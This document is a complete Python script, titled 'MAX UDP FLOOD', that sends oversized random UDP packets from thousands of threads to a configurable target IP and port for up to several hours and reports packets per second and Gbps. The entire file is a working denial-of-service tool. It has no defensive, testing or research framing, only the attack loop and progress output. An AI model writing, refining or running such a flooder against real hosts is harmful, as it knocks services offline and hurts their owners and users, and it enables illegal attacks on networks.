#!/usr/bin/env python3
import os, socket, threading, time, sys, struct, random

TARGET_IP   = os.getenv("TARGET_IP", "").strip()
TARGET_PORT = int(os.getenv("TARGET_PORT", "80").strip())
THREADS     = min(int(os.getenv("THREADS", "3000").strip()), 5000)
DURATION    = min(int(os.getenv("DURATION", "300").strip()), 21000)

if not TARGET_IP:
    print("❌ TARGET_IP not set", file=sys.stderr)
    sys.exit(1)

print(f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
print(f"🚀 MAX UDP FLOOD")
print(f"🎯 Target   : {TARGET_IP}:{TARGET_PORT}")
print(f"🧵 Threads  : {THREADS}")
print(f"⏰ Duration : {DURATION}s")
print(f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")

running    = True
sent_count = 0
bytes_sent = 0
lock       = threading.Lock()

# Pre-generate 20 different payloads
PAYLOADS = [os.urandom(65507) for _ in range(20)]
TARGET   = (TARGET_IP, TARGET_PORT)

def flood():
    global sent_count, bytes_sent
    idx = 0
    # Single persistent socket per thread - fastest approach
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 212992)  # 208KB buffer
        sock.connect(TARGET)  # connected UDP - faster than sendto
        local_count = 0
        local_bytes = 0
        while running:
            try:
                sock.send(PAYLOADS[idx % 20])
                local_count += 1
                local_bytes += 65507
                idx += 1
                # Batch update global counter every 100 packets
                if local_count % 100 == 0:
                    with lock:
                        sent_count += 100
                        bytes_sent += local_bytes
                    local_bytes = 0
            except Exception:
                pass
    except Exception:
        pass
    finally:
        try:
            sock.close()
        except:
            pass

# Launch threads in batches to avoid startup lag
print(f"⏳ Launching {THREADS} threads...")
for i in range(THREADS):
    t = threading.Thread(target=flood, daemon=True)
    t.start()
    if i % 500 == 499:
        print(f"  ✅ {i+1} threads started...")

print(f"🔥 ALL {THREADS} THREADS RUNNING!")
print(f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")

start      = time.time()
last_pkts  = 0

try:
    while time.time() - start < DURATION:
        time.sleep(5)
        elapsed   = time.time() - start
        remaining = max(0, DURATION - elapsed)

        with lock:
            pkts     = sent_count
            total_gb = bytes_sent / (1024**3)

        delta_pkts  = pkts - last_pkts
        pps         = delta_pkts / 5
        mbps        = (delta_pkts * 65507 * 8) / (1024**2 * 5)
        gbps        = mbps / 1024
        last_pkts   = pkts

        print(
            f"[{int(elapsed):5}s/{DURATION}s] "
            f"Pkts: {pkts:>12,} | "
            f"{pps:>10,.0f} pps | "
            f"{mbps:>8.1f} Mbps | "
            f"{gbps:.4f} Gbps | "
            f"Total: {total_gb:.3f} GB | "
            f"Left: {int(remaining)}s",
            flush=True
        )

except KeyboardInterrupt:
    print("⏹️ Interrupted")
finally:
    running = False

time.sleep(2)
elapsed = time.time() - start
with lock:
    final_gb  = bytes_sent / (1024**3)
    avg_pps   = sent_count / elapsed if elapsed else 0
    avg_mbps  = (bytes_sent * 8) / (1024**2 * elapsed) if elapsed else 0
    avg_gbps  = avg_mbps / 1024

print(f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
print(f"✅ COMPLETED")
print(f"📊 Packets   : {sent_count:,}")
print(f"📦 Data      : {final_gb:.4f} GB")
print(f"⚡ Avg Speed : {avg_pps:,.0f} pps | {avg_mbps:.1f} Mbps | {avg_gbps:.4f} Gbps")
print(f"⏰ Runtime   : {int(elapsed)}s")
print(f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
